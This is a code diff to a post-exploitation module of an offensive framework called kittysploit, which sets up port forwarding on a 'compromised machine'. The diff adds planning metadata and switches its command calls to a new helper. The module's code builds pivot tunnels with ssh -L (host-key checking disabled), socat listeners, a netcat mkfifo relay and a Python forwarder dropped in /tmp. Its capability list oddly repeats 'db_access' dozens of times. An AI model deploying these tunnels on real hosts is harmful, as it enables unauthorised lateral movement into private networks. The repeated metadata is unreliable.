@@ -1,10 +1,11 @@
 from kittysploit import *
 from lib.post.linux.system import System
+from lib.post.linux.session import LinuxSessionMixin
 import socket
 import threading
 import time
 
-class Module(Post, System):
+class Module(Post, System, LinuxSessionMixin):
 
     __info__ = {
         "name": "Linux Port Forwarding",
@@ -21,6 +22,56 @@ class Module(Post, System):
         'reversible': False,
         'approval_required': True,
         'produces': ['risk_signals'],
+        'cost': 1.5,
+        'noise': 0.5,
+        'value': 1.0,
+        'requires':         {'min_endpoints': 0,
+         'min_params': 0,
+         'tech_hints_any': [],
+         'tech_hints_all': [],
+         'specializations_any': [],
+         'risk_signals_any': [],
+         'auth_session': False,
+         'capabilities_any': [],
+         'capabilities_all': [],
+         'confidence_min': {},
+         'confidence_min_any': {},
+         'endpoint_pattern_any': [],
+         'param_any': [],
+         'api_surface_ready': False},
+        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 's7comm', 'from_detail': ''},
+                                   {'capability': 'ot_assets', 'from_detail': ''},
+                                   {'capability': 'ot_assets', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''}],
+         'consumes_capabilities': ['shell'],
+         'option_bindings': {},
+         'suggested_followups': []},
     },
     }
 
@@ -33,6 +84,9 @@ class Module(Post, System):
     def run(self):
         """Create port forward through the session"""
         
+        if not self.linux_require_linux():
+            return False
+
         print_status("Setting up port forwarding...")
         print_info(f"Type: {self.forward_type}")
         print_info(f"Local port: {self.local_port}")
@@ -102,17 +156,17 @@ class Module(Post, System):
     
     def _check_ssh_available(self):
         """Check if SSH is available on the compromised machine"""
-        result = self.cmd_exec("which ssh 2>/dev/null")
+        result = self.linux_execute("which ssh 2>/dev/null")
         return result and result.strip()
     
     def _check_socat_available(self):
         """Check if socat is available"""
-        result = self.cmd_exec("which socat 2>/dev/null")
+        result = self.linux_execute("which socat 2>/dev/null")
         return result and result.strip()
     
     def _check_nc_available(self):
         """Check if netcat is available"""
-        result = self.cmd_exec("which nc 2>/dev/null || which netcat 2>/dev/null")
+        result = self.linux_execute("which nc 2>/dev/null || which netcat 2>/dev/null")
         return result and result.strip()
     
     def _ssh_local_forward(self):
@@ -126,7 +180,7 @@ class Module(Post, System):
             tunnel_cmd = f"ssh -f -N -L {self.local_port}:{self.remote_host}:{self.remote_port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null localhost 2>&1"
             
             print_info(f"Executing: {tunnel_cmd}")
-            result = self.cmd_exec(tunnel_cmd)
+            result = self.linux_execute(tunnel_cmd)
             
             if result and "error" not in result.lower() and "permission denied" not in result.lower():
                 print_success(f"SSH local forward created successfully!")
@@ -165,11 +219,11 @@ class Module(Post, System):
             
             if self.background:
                 print_info("Starting socat in background...")
-                result = self.cmd_exec(socat_cmd)
+                result = self.linux_execute(socat_cmd)
                 time.sleep(1)  # Give it time to start
                 
                 # Check if it's running
-                check = self.cmd_exec(f"ps aux | grep -v grep | grep 'socat.*{self.local_port}'")
+                check = self.linux_execute(f"ps aux | grep -v grep | grep 'socat.*{self.local_port}'")
                 if check and check.strip():
                     print_success(f"Socat port forward started in background!")
                     print_info(f"Port {self.local_port} is forwarding to {self.remote_host}:{self.remote_port}")
@@ -181,7 +235,7 @@ class Module(Post, System):
             else:
                 print_info("Starting socat (foreground mode)...")
                 print_warning("This will block until you stop it (Ctrl+C)")
-                result = self.cmd_exec(f"socat TCP-LISTEN:{self.local_port},fork,reuseaddr TCP:{self.remote_host}:{self.remote_port}")
+                result = self.linux_execute(f"socat TCP-LISTEN:{self.local_port},fork,reuseaddr TCP:{self.remote_host}:{self.remote_port}")
                 return True
                 
         except Exception as e:
@@ -203,10 +257,10 @@ class Module(Post, System):
             socat_cmd = f"socat TCP:{self.remote_host}:{self.local_port} TCP-LISTEN:{self.remote_port},fork,reuseaddr &"
             
             if self.background:
-                result = self.cmd_exec(socat_cmd)
+                result = self.linux_execute(socat_cmd)
                 time.sleep(1)
                 
-                check = self.cmd_exec(f"ps aux | grep -v grep | grep 'socat.*{self.remote_port}'")
+                check = self.linux_execute(f"ps aux | grep -v grep | grep 'socat.*{self.remote_port}'")
                 if check and check.strip():
                     print_success(f"Reverse socat port forward started!")
                     print_info(f"Port {self.remote_port} on compromised machine forwards to {self.remote_host}:{self.local_port}")
@@ -216,7 +270,7 @@ class Module(Post, System):
                     return False
             else:
                 print_warning("Running in foreground (will block)...")
-                result = self.cmd_exec(f"socat TCP:{self.remote_host}:{self.local_port} TCP-LISTEN:{self.remote_port},fork,reuseaddr")
+                result = self.linux_execute(f"socat TCP:{self.remote_host}:{self.local_port} TCP-LISTEN:{self.remote_port},fork,reuseaddr")
                 return True
                 
         except Exception as e:
@@ -232,10 +286,10 @@ class Module(Post, System):
             # Netcat approach: mkfifo pipe && nc -l -p local_port < pipe | nc remote_host remote_port > pipe
             setup_cmd = f"mkfifo /tmp/nc_pipe_{self.local_port} 2>/dev/null; nc -l -p {self.local_port} < /tmp/nc_pipe_{self.local_port} | nc {self.remote_host} {self.remote_port} > /tmp/nc_pipe_{self.local_port} &"
             
-            result = self.cmd_exec(setup_cmd)
+            result = self.linux_execute(setup_cmd)
             time.sleep(1)
             
-            check = self.cmd_exec(f"ps aux | grep -v grep | grep 'nc.*{self.local_port}'")
+            check = self.linux_execute(f"ps aux | grep -v grep | grep 'nc.*{self.local_port}'")
             if check and check.strip():
                 print_success("Netcat port forward started (may be unreliable)")
                 return True
@@ -253,7 +307,7 @@ class Module(Post, System):
             print_status("Attempting Python-based port forwarding...")
             
             # Check if Python is available
-            python_check = self.cmd_exec("which python3 2>/dev/null || which python 2>/dev/null")
+            python_check = self.linux_execute("which python3 2>/dev/null || which python 2>/dev/null")
             if not python_check or not python_check.strip():
                 print_error("Python not available for port forwarding")
                 return False
@@ -308,7 +362,7 @@ while True:
             # Write script to temp file and execute
             script_path = f"/tmp/pf_{self.local_port}.py"
             write_cmd = f"cat > {script_path} << 'EOFPYTHON'\n{python_script}\nEOFPYTHON"
-            self.cmd_exec(write_cmd)
+            self.linux_execute(write_cmd)
             
             # Make executable and run
             if self.background:
@@ -316,10 +370,10 @@ while True:
             else:
                 run_cmd = f"python3 {script_path}"
             
-            result = self.cmd_exec(run_cmd)
+            result = self.linux_execute(run_cmd)
             time.sleep(1)
             
-            check = self.cmd_exec(f"ps aux | grep -v grep | grep 'python.*{script_path}'")
+            check = self.linux_execute(f"ps aux | grep -v grep | grep 'python.*{script_path}'")
             if check and check.strip():
                 print_success("Python port forward started!")
                 print_info(f"Script saved to: {script_path}")
